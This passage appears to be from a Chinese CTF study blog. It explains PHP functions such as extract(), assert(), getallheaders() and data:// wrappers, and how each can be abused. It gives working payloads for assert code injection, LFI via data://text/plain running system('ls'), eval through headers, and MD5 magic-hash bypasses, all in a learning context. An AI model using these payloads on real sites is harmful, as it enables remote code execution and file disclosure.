<p><strong>var_dump(pathinfo(‘sandox&#x2F;cfbb870b58817bf7705c0bd826e8dba7&#x2F;123.txt’));</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(7) &quot;123.txt&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(3) &quot;txt&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="9-file-put-contents"><a href="#9-file-put-contents" class="headerlink" title="9.file_put_contents()"></a>9.file_put_contents()</h4><p>将结果放进文件中</p>
<h4 id="10-addslashes"><a href="#10-addslashes" class="headerlink" title="10.addslashes()"></a>10.addslashes()</h4><p><code>addslashes</code>是PHP中的一个字符串处理函数，用于在字符串中的某些特定字符前添加反斜杠（<code>\</code>），以确保这些字符在后续的处理过程中不会引起语法错误或安全问题。这些特定字符包括单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）、反斜杠（<code>\</code>）和NULL字节。</p>
<p><strong>功能说明</strong></p>
<ul>
<li><strong>作用</strong>：在字符串中的单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）、反斜杠（<code>\</code>）和NULL字节前添加反斜杠。</li>
<li><strong>目的</strong>：防止这些字符在SQL查询、字符串拼接等操作中引起语法错误或安全问题（如SQL注入）。</li>
<li><strong>返回值</strong>：返回处理后的字符串。</li>
</ul>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello &#x27;World&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$escaped_str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_str</span>; <span class="comment">// 输出：Hello \&#x27;World\&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="11-extract"><a href="#11-extract" class="headerlink" title="11.extract()"></a>11.extract()</h4><p>用于从数组中提取元素并将它们导入到当前的符号表中，即将数组的键名作为变量名，键值作为变量值。</p>
<p>很可能会覆盖变量！！！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当我们传入SESSION[flag]&#x3D;123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失</p>
<h4 id="12-assert"><a href="#12-assert" class="headerlink" title="12.assert()"></a>12.assert()</h4><ol>
<li><strong>基本概念</strong><ul>
<li><code>assert()</code> 函数是 PHP 中用于断言的内置函数。断言是一种编程概念，它允许程序员在程序代码中放置检查点，以验证程序的状态是否符合预期。在 PHP 中，这个函数默认是启用的，它可以帮助开发者在开发和调试过程中快速发现程序中的逻辑错误。</li>
<li><code>assert()</code>函数会将读入的代码当作php执行</li>
</ul>
</li>
</ol>
<p>E.g</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>先将strpos闭合，然后将后面的语句<code>&#39;..&#39;)===false&quot;) or die (&quot;Detected hacking attempt!&quot;)</code>注释掉</p>
<p>然后构造payload：<code>?page=&#39;.phpinfo();//</code></p>
<p><code>&#39;).system(&quot;cat templates/flag.php&quot;);//</code></p>
<p>变为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;).system(&quot;</span>cat templates/flag.php<span class="string">&quot;);//.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);)</span><br></pre></td></tr></table></figure>

<p>只留下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;).system(&quot;</span>cat templates/flag.php<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>



<h4 id="13-uniqid"><a href="#13-uniqid" class="headerlink" title="13.uniqid()"></a>13.uniqid()</h4><p><code>uniqid()</code> 是 PHP 中的一个函数，用于生成一个唯一的 ID，通常用于创建唯一的标识符，例如文件名、临时标识符等。它基于当前时间戳生成，具有较高的唯一性，但并不是绝对的全球唯一。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(); <span class="comment">// 输出类似: 55c31b2d67f66</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带前缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;prefix_&#x27;</span>); <span class="comment">// 输出类似: prefix_55c31b2d67f66</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加额外熵</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;&#x27;</span>, <span class="literal">true</span>); <span class="comment">// 输出类似: 55c31b2d7e5e25.43184718</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="14-date"><a href="#14-date" class="headerlink" title="14.date()"></a>14.date()</h4><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/4096">CISCN 2023 华北]ez_date | NSSCTF</a></p>
<p>PHP 中的 <code>date()</code> 函数是一个非常重要的日期和时间处理函数，它能够格式化一个时间戳为更易读的日期和时间形式</p>
<p><strong>常用格式化参数</strong></p>
<ul>
<li><code>d</code>：表示一个月中的第几天，两位数字，如果是一天则前面补零，如 <code>01</code> 到 <code>31</code>。</li>
<li><code>m</code>：表示一年中的第几个月，两位数字，如 <code>01</code> 到 <code>12</code>。</li>
<li><code>Y</code>：四位数字完整表示年份，如 <code>2023</code>。</li>
<li><code>H</code>：表示小时，24 小时制，两位数字，如 <code>00</code> 到 <code>23</code>。</li>
<li><code>i</code>：表示分，两位数字，如 <code>00</code> 到 <code>59</code>。</li>
<li><code>s</code>：表示秒，两位数字，如 <code>00</code> 到 <code>59</code>。</li>
<li><code>a</code>：表示 AM 或 PM（上午或下午）。</li>
<li><code>l</code>:（小写的 L）：完整的星期几的文本名称，如 <code>Monday</code>。</li>
<li><code>M</code>：三个字母缩写的月份名称，如 <code>Jan</code>。</li>
<li><code>g</code> :用于获取小时部分，范围是从 1 到 12。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 基本用法，获取当前日期和时间</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>); <span class="comment">// 输出类似: 2023-10-05 15:30:45</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化特定时间戳</span></span><br><span class="line"><span class="variable">$timestamp</span> = <span class="title function_ invoke__">strtotime</span>(<span class="string">&quot;2023-10-01 12:00:00&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;l, F j, Y, g:i A&quot;</span>, <span class="variable">$timestamp</span>); <span class="comment">// 输出: Sunday, October 1, 2023, 12:00 PM</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前的日期和时间中星期几的名称</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">date</span>(<span class="string">&quot;l&quot;</span>); <span class="comment">// 输出类似: Friday</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="15-stream-context-create"><a href="#15-stream-context-create" class="headerlink" title="15.@stream_context_create()"></a>15.@stream_context_create()</h4><p><code>stream_context_create</code> 是 PHP 中用于创建一个流（stream）上下文的函数。流上下文是为文件流（比如网络请求）配置选项的一个集合，它可以让开发者对流的行为进行自定义，比如设置请求头、超时时间、用户认证等。</p>
<p><strong>语法</strong></p>
<ul>
<li><code>resource stream_context_create ( array $options [, array $params ] )</code></li>
<li>参数 <code>options</code> 是一个关联数组，用于指定不同协议（如 HTTP、FTP 等）的上下文选项，默认值为 NULL。例如，对于 HTTP 请求，可以设置 <code>header</code> 选项来添加请求头信息。</li>
<li>参数 <code>params</code> 是一个关联数组，用于指定上下文的参数，如通知回调函数等，默认值为 NULL。</li>
</ul>
<p><strong>使用示例</strong></p>
<ul>
<li>创建一个 HTTP 请求上下文，设置用户代理和请求头：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span> = [</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;header&#x27;</span> =&gt; <span class="string">&quot;User-Agent: PHP\r\n&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;timeout&#x27;</span> =&gt; <span class="number">30</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用上下文打开网页并获取内容</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;https://www.example.com&#x27;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>在这个例子中，<code>stream_context_create</code> 创建了一个用于 HTTP 协议的上下文，设置了请求方法为 <code>GET</code>、添加了用户代理头，并设置了超时时间为 30 秒。然后使用 <code>file_get_contents</code> 函数和这个上下文来获取网页的内容。</li>
</ul>
<h4 id="16-strcmp"><a href="#16-strcmp" class="headerlink" title="16.strcmp()"></a>16.strcmp()</h4><p><code>strcmp</code> 是一个用于比较两个字符串的函数。</p>
<ol>
<li><strong>函数原型</strong><ul>
<li><code>int strcmp ( string $str1 , string $str2 )</code></li>
</ul>
</li>
<li><strong>参数</strong><ul>
<li><code>$str1</code>：第一个要比较的字符串。</li>
<li><code>$str2</code>：第二个要比较的字符串。</li>
</ul>
</li>
<li><strong>返回值</strong><ul>
<li>如果返回值小于 0，表示 <code>$str1</code> 小于 <code>$str2</code>。</li>
<li>如果返回值等于 0，表示 <code>$str1</code> 和 <code>$str2</code> 相等。</li>
<li>如果返回值大于 0，表示 <code>$str1</code> 大于 <code>$str2</code></li>
</ul>
</li>
</ol>
<h4 id="17-extract"><a href="#17-extract" class="headerlink" title="17.extract()"></a>17.extract()</h4><p><code>extract()</code> 是 PHP 中一个用于从数组中将变量导入到当前符号表的函数。它主要用来方便地将数组中的键值对转换为单独的变量。下面详细介绍其使用方法、参数以及注意事项：</p>
<p><strong>函数定义</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">extract</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">int</span> <span class="variable">$extract_type</span> = EXTR_OVERWRITE [, <span class="keyword">string</span> <span class="variable">$prefix</span> ]] )</span><br></pre></td></tr></table></figure>

<p><strong>参数详解</strong></p>
<ul>
<li><strong><code>$array</code></strong> ：必需。要从其中提取变量的数组。</li>
<li><strong><code>$extract_type</code></strong> ：可选。用于指定冲突时的处理方式，默认值为 <code>EXTR_OVERWRITE</code>。常见的可选值有：<ul>
<li><code>EXTR_OVERWRITE</code> ：如果有冲突，覆盖已存在的变量。</li>
<li><code>EXTR_SKIP</code> ：如果有冲突，不覆盖已存在的变量。</li>
<li><code>EXTR_PREFIX_SAME</code> ：如果有冲突，则给变量添加前缀。</li>
<li><code>EXTR_PREFIX_ALL</code> ：给所有变量添加前缀。</li>
<li><code>EXTR_PREFIX_INVALID</code> ：仅给无效的或数字的变量名添加前缀。</li>
</ul>
</li>
<li><strong><code>$prefix</code></strong> ：可选。如果指定了前缀类型，需要提供一个前缀。前缀用于区分变量名，避免冲突。</li>
</ul>
<p><strong>返回值</strong></p>
<p>该函数返回成功提取的变量数目。</p>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>; <span class="comment">// 输出：Alice</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>; <span class="comment">// 输出：30</span></span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong></p>
<ul>
<li><strong>变量覆盖风险</strong> ：使用 <code>extract()</code> 时需要特别小心，因为它可能导致变量覆盖问题。如果从外部输入（如用户输入）构造的数组中提取变量，可能会无意中覆盖重要的变量，从而引发意外行为或安全漏洞。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 假设有一个数组，其内容可能来自外部输入（如用户提交的表单数据）</span><br><span class="line">$user_input = array(&quot;user_id&quot; =&gt; &quot;123&quot;, &quot;role&quot; =&gt; &quot;admin&quot;);</span><br><span class="line"></span><br><span class="line">// 现变量有的</span><br><span class="line">$user_id = &quot;456&quot;;</span><br><span class="line">$role = &quot;user&quot;;</span><br><span class="line"></span><br><span class="line">// 使用 extract() 函数提取数组中的变量</span><br><span class="line">extract($user_input);</span><br><span class="line"></span><br><span class="line">// 输出结果，查看变量是否被覆盖</span><br><span class="line">echo &quot;User ID: &quot; . $user_id . &quot;\n&quot;;</span><br><span class="line">echo &quot;Role: &quot; . $role . &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">// 如果 $user_input 数组来自不可信的外部输入，这就可能导致严重的安全问题</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//User ID: 123 Role: admin</span><br></pre></td></tr></table></figure>



<h4 id="18-getallheaders"><a href="#18-getallheaders" class="headerlink" title="18.getallheaders()"></a>18.getallheaders()</h4><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!!C!!E!!)</p>
<p>使用 <code>getallheaders()</code> 获取当前请求的所有 HTTP 标头，并返回一个数组</p>
<h4 id="19-pos"><a href="#19-pos" class="headerlink" title="19.pos()"></a>19.pos()</h4><p><code>pos()</code> 函数是 PHP 中的一个内置函数，用于返回数组中当前元素的值。它是 <code>current()</code> 函数的别名，二者功能完全相同</p>
<p><strong>参数</strong></p>
<ul>
<li><code>$array</code>：必需，指定要操作的数组。</li>
</ul>
<p><strong>返回值</strong></p>
<p>返回数组中当前指针所指向的元素的值。如果指针超出了数组的范围，则返回 <code>false</code>。</p>
<p><strong>使用示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 1，因为指针最初指向第一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$array</span>); <span class="comment">// 移动指针到下一个元素</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">pos</span>(<span class="variable">$array</span>); <span class="comment">// 输出 3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="19-array-reverse"><a href="#19-array-reverse" class="headerlink" title="19.array_reverse()"></a>19.array_reverse()</h4><p>这个函数用于反转数组的顺序。它接收一个数组作为参数，并返回一个新的数组，其元素顺序与原数组相反</p>
<p>可以结合pos()和eval()使用，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: example.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html</span><br><span class="line">X-Custom-Header: &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>getallheaders()</code> 返回的数组是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;Mozilla/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Custom-Header&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>array_reverse()</code> 反转后的数组是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;X-Custom-Header&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;Mozilla/5.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span> =&gt; <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>pos()</code> 获取反转后数组的第一个元素，即 <code>&#39;&lt;?php phpinfo(); ?&gt;&#39;</code>。</p>
</li>
<li><p><code>eval()</code> 尝试执行这个字符串作为 PHP 代码。如果字符串是有效的 PHP 代码，它会被执行。</p>
</li>
</ol>
<p>例题为主</p>
<h3 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]Begin of PHP)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Begin of PHP)</h3><p><strong>MD5比较：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>

<p><strong>数组可以绕过正则匹配</strong></p>
<p><strong>extract覆盖漏洞</strong></p>
<p><strong>数组也可以绕过strcmp比较</strong></p>
<h3 id="BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-R-C-E"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[NewStarCTF 2023 公开赛道]R!C!E!)"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!C!E!)</h3><p>主要是一个md5的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;c4d038&quot;</span>  <span class="comment"># 目标MD5值的前六位</span></span><br><span class="line">prefix_bytes = prefix.encode()  <span class="comment"># 将前缀转换为字节串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    b = i.to_bytes(<span class="number">22</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    m = hashlib.md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> m.startswith(prefix):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p> [ 绕过 _</p>
<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/img/lazy.gif" data-original="https://i-blog.csdnimg.cn/blog_migrate/f4f460a7e99d561e19b63142a1cf9751.png" alt="img"></p>
<p><strong>data 伪协议 格式：</strong><br><code>data://[&lt;MIME-type&gt;][;charset=][;base64],&lt;data&gt;</code></p>
<ul>
<li><strong>MIME-type：</strong>指定数据的类型，默认是 text&#x2F;plain。</li>
<li><strong>charset：</strong>指定数据的编码类型，如 utf-8。</li>
<li><strong>base64：</strong>如果使用 Base64 编码，则加上该标识。</li>
<li><strong>data：</strong>实际的数据内容。</li>
</ul>
<p><strong>text&#x2F;plain 的具体含义</strong></p>
<p><strong>text&#x2F;plain MIME 类型：</strong></p>
<ol>
<li>表示数据是普通文本文件，没有任何特定的格式或编码。</li>
<li>在 PHP 的文件包含漏洞中，当使用 data:&#x2F;&#x2F;text&#x2F;plain 时，PHP 会将数据视为纯文本进行读取。</li>
<li>但是，如果该文本数据本身是 PHP 代码（如<code> &lt;?php system(&#39;ls&#39;); ?&gt;</code>），且它被 include()、require() 等函数加载，那么它会被当作 PHP 代码解析和执行。</li>
</ol>
<p><strong>data:&#x2F;&#x2F;text&#x2F;plain 的实际作用</strong></p>
<p>在 LFI 漏洞中使用 data:&#x2F;&#x2F;text&#x2F;plain 可以让我们通过 URL 注入 PHP 代码，并且这些代码会在服务器端执行。</p>
<p><strong>示例：执行系统命令</strong></p>
<p><strong>URL：</strong></p>
<p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
<p><strong>解释：</strong></p>
<ul>
<li>data:&#x2F;&#x2F; 告诉 PHP 加载内联数据。</li>
<li>text&#x2F;plain 表示数据是纯文本类型，但在通过 include() 加载时，PHP 会解析文本中的代码片段（如 <code>&lt;?php system(&#39;ls&#39;); ?&gt;</code>），并将其执行。</li>
</ul>
